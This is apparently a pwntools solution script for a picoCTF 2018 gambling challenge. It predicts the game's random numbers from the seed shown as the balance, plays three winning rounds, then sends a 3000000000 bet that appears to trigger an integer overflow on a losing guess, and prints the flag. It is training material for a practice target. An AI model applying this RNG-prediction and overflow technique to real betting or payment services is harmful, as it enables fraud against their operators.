#!/usr/bin/python
from pwn import *
import re

l = log.progress('Status')
s = remote('2018shell1.picoctf.com', 5731)

l.status('Getting seed...')
seed = re.findall(r'Current Balance: \$(\d{1,4})', s.recvuntil('> '))[0]

l.status('Generating number sequence...')
p = process(['./generate', seed])
seq = p.recv().strip().split(' ')


for i in range(3):
	l.status('Started Round ' + str(i + 1))
	s.sendline('1')
	s.recvuntil('> ')
	s.sendline(seq[i])
	s.recvuntil('> ')
	
l.status('Starting exploit')

s.sendline('3000000000')
s.recvuntil('> ')

wrong = 0
if int(seq[3]) == 35:
	wrong = int(seq[3]) - 1
else:
	wrong = int(seq[3]) + 1

l.status('Waiting for Flag...')
s.sendline(str(wrong))
flag = re.findall(r'(picoCTF\{.+\})', s.recvall(timeout=10))[0]
l.success('Got Flag!')
log.success('Flag: ' + flag)
